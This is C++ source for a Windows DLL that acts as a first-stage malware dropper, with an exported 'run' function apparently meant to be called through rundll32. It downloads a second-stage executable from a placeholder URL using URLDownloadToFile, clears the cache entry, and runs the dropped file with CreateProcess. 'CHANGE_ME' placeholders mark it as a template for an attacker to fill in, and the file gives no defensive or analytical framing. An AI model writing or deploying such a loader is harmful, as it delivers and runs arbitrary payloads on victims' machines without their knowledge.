#include "pch.h"
#include <windows.h>
#include <sstream>
#include <stdio.h>
#include <urlmon.h>
#include <Wininet.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Wininet.lib")
int download()
{
    LPCWCHAR url = L"CHANGE_ME_payload_url"; //e.g. http://domain.com/payload.exe
    LPCWCHAR save = L"CHANGE_ME_dropped_filename.exe"; //Second stage exe will be dropped in same folder Rundll32.exe command is executed in
    DeleteUrlCacheEntry(url);
    HRESULT hr = URLDownloadToFile(NULL, url, save, 0, NULL);
    return 0;
}
void execute()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcess(
        TEXT("CHANGE_ME_full_file_path.exe"), //Full path of dropped second stage payload (\\ is needed) (e.g. C:\\temp\\file.exe)
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi))
    {
        return;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
extern "C" __declspec(dllexport) void run()
{
    download();
    execute();
}
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
